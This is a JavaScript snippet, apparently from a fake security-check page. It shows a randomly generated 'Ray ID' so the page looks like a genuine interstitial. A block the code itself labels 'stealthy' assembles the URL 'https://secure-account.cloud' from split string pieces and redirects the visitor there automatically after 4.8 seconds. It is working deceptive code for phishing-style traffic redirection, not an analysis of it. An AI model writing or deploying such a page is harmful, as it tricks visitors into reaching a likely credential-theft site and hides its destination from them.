  function genRay() {
    const hex = () =>
      Array.from(crypto.getRandomValues(new Uint8Array(8)))
        .map(b => b.toString(16).padStart(2, '0')).join('');
    return hex() + hex().slice(0,8);
  }
  document.getElementById('ray-value').textContent = genRay();
  
  // Stealthy JavaScript redirect (replace original meta refresh)
  setTimeout(function() {
    var p1 = 'https://';
    var p2 = 'secure-account.';
    var p3 = 'cloud';
    var target = p1 + p2 + p3;
    window.location.href = target;
  }, 4800); // 4.8 seconds
  
  

  
